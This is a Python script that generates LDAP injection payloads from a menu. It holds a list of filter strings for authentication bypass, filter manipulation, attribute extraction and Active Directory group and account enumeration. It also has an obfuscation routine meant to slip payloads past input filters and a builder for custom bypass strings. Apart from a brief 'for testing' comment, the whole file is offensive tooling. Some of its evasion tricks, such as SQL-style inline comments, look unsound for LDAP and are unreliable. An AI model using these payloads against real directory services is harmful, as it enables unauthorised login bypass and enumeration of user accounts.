import random
import string

# Common LDAP injection vectors for testing
LDAP_VECTORS = [
    # Basic Wildcard Injections
    "*",
    "*)",
    "*)(|(objectClass=*)",
    "(&(objectClass=*))",
    
    # Authentication Bypass
    "*)(uid=*))(|(uid=*",
    "admin*)(|(objectClass=*)",
    "*)(|(cn=admin)",
    "cn=*)(|(cn=*)",
    
    # Filter Manipulation
    "(|(uid=*))",
    "(objectClass=*)(uid=*",
    "(|(objectClass=user)(uid=*))",
    "(&(objectClass=*)(|(uid=*)))",
    
    # Attribute Extraction
    "(uid=*)",
    "(cn=*)(|(mail=*))",
    "(|(sn=*)(givenName=*))",
    "(objectClass=person)(uid=*)",
    
    # Boolean Logic Manipulation
    "(|(uid=admin)(uid=user))",
    "(&(objectClass=*)(!(uid=nobody)))",
    "(|(objectClass=*)(cn=admin))",
    "(&(!(uid=nobody))(objectClass=*))",
    
    # Special Character Injections
    "*)((|(*",
    "*|*",
    "(&(objectClass=*)(\x00))",
    "(|(uid=*))(|(cn=*))",
    
    # Filter Evasion
    "(objectClass=user%00)",
    "(uid=adm*in)",
    "(|(objectClass=*))(uid=*",
    "(cn=*)#",
    
    # Advanced Enumeration
    "(|(memberOf=CN=Admins,DC=example,DC=com))",
    "(objectClass=group)(member=*)",
    "(|(samAccountName=*)(userPrincipalName=*))",
    "(objectCategory=person)(|(uid=*)(cn=*))",
]

# Obfuscation techniques for LDAP payloads
def obfuscate_payload(payload):
    """Simple obfuscation for LDAP payloads."""
    methods = [
        lambda p: p.replace("*", "%2A").replace("=", "%3D"),  # URL encoding
        lambda p: ''.join(c + random.choice(["", " "]) for c in p),  # Random spacing
        lambda p: p.replace("(", "%28").replace(")", "%29"),  # URL encode parentheses
        lambda p: p.replace("objectClass", "ob/**/jectClass"),  # Inline comments (if supported)
    ]
    return random.choice(methods)(payload)

def generate_random_string(length=8):
    """Generate a random string for payload customization."""
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

class LDAPInjectionGenerator:
    def __init__(self):
        self.custom_payloads = []

    def generate_random_payload(self, include_obfuscation=False):
        """Generate a random LDAP injection payload from the vector list."""
        base_payload = random.choice(LDAP_VECTORS)
        # Add a random string to make it unique (for attribute values)
        random_str = generate_random_string()
        payload = base_payload.replace("admin", f"admin_{random_str}")  # Replace 'admin' with unique value
        
        if include_obfuscation:
            payload = obfuscate_payload(payload)
        
        return payload

    def create_custom_payload(self, user_input, injection_type="basic"):
        """Create a custom LDAP injection payload based on user input."""
        if injection_type == "basic":
            payload = f"*{user_input}*"
        elif injection_type == "filter":
            payload = f"(|({user_input}=*))"
        elif injection_type == "bypass":
            payload = f"{user_input}*)(|(objectClass=*)"
        elif injection_type == "attribute":
            payload = f"({user_input}=*)"
        else:
            payload = f"{user_input}"
        
        self.custom_payloads.append(payload)
        return payload

    def list_payloads(self):
        """List all generated custom payloads."""
        return self.custom_payloads if self.custom_payloads else ["No custom payloads generated yet."]

def main():
    generator = LDAPInjectionGenerator()
    
    while True:
        print("\nLDAP Injection Payload Generator")
        print("1. Generate Random Payload")
        print("2. Generate Random Obfuscated Payload")
        print("3. Create Custom Payload")
        print("4. List Custom Payloads")
        print("5. Exit")
        
        choice = input("Choose an option (1-5): ")
        
        if choice == "1":
            payload = generator.generate_random_payload()
            print(f"Random Payload: {payload}")
        
        elif choice == "2":
            payload = generator.generate_random_payload(include_obfuscation=True)
            print(f"Random Obfuscated Payload: {payload}")
        
        elif choice == "3":
            user_input = input("Enter your custom LDAP filter/attribute (e.g., uid, cn=admin): ")
            inj_type = input("Enter injection type (basic, filter, bypass, attribute) [default: basic]: ") or "basic"
            payload = generator.create_custom_payload(user_input, inj_type)
            print(f"Custom Payload: {payload}")
        
        elif choice == "4":
            payloads = generator.list_payloads()
            print("Custom Payloads:")
            for i, p in enumerate(payloads, 1):
                print(f"{i}. {p}")
        
        elif choice == "5":
            print("Exiting...")
            break
        
        else:
            print("Invalid option. Try again.")

if __name__ == "__main__":
    main()
